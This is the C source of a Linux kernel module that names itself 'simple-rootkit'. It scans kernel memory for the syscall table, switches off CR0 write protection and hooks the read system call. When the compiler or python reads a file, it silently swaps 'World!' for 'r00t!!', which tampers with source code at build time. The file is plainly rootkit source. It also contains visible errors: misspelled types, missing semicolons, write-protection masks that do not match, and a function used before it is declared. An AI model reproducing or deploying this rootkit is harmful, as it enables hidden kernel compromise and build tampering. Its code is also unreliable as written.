#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <asm/uaccess.h>

unsigned long **sys_call_table;

unsigned long original_cr0;

asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count);

static int __init start(void)
{
    if(!(sys_call_table = search_sys_call_table()))
        return -1;
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x0001000);
    ref_sys_read = (void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    write_cr0(original_cr0);

    return 0;
}

static void __exit end(void)
{
    if(!sys_call_table) {
        return;
    }
    write_cr0(original_cr0 & ~0x00010000);
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    write_cr0(original_cr0)
}

static unsigned long **search_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned logn **sct;
    printk("Starting syscall table scan from: %lx\n", offset);
    while (offset < ULLONG_MAX) {
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *) sys_close){
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}
 
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    char *kernel_buf;
    long ret =ref_sys_read(fd, buf, count);
    if (ret >=6 && fd > 2) {
        if (strcmp(current->comm, "cc1") == 0 || strcmp(current->comm, "python") == 0){

            long i;
            cahr *kernel_buf;
            if (count > PAGE_SIZE) {
                printk("simple-rootkit refused to kmalloc > %li B (%lu)\n", PAGE_SIZE, count);
                return ret;
            }
            kernel_buf = kmalloc(count, GFP_KERNEL);
            if(!kernel_buf) {
                printk("simple-rootkit failed to allocate memory... :(\n");
                return ret;
            }
            if(copy_from_user(kernel_buf, buf, count)){
                printk("simple-rootkit failed to copy the read buffer... :(\n");
                kfree(kernel_buf);
                return ret;
            }

            for (long i=0; i < (ret - 6); i++) {
                if (kernel_buf[i] == 'W' &&
                    kernel_buf[i+1] == 'o' &&
                    kernel_buf[i+2] == 'r' &&
                    kernel_buf[i+3] == 'l' &&
                    kernel_buf[i+4] == 'd' &&
                    kernel_buf[i+5] == '!') {
                    kernel_buf[i] = 'r';
                    kernel_buf[i+1] = '0';   
                    kernel_buf[i+2] = '0'; 
                    kernel_buf[i+3] = 't'; 
                    kernel_buf[i+4] = '!'; 
                    kernel_buf[i+5] = '!';
                }
            }
            if (copy_to_user(buf, kernel_buf, count))
                printk("failed to write to read buffer... :(\n")+
            kfree(kernel_buf);
        }
        }            
        return ret
}

module_init(start);
module_exit(end);
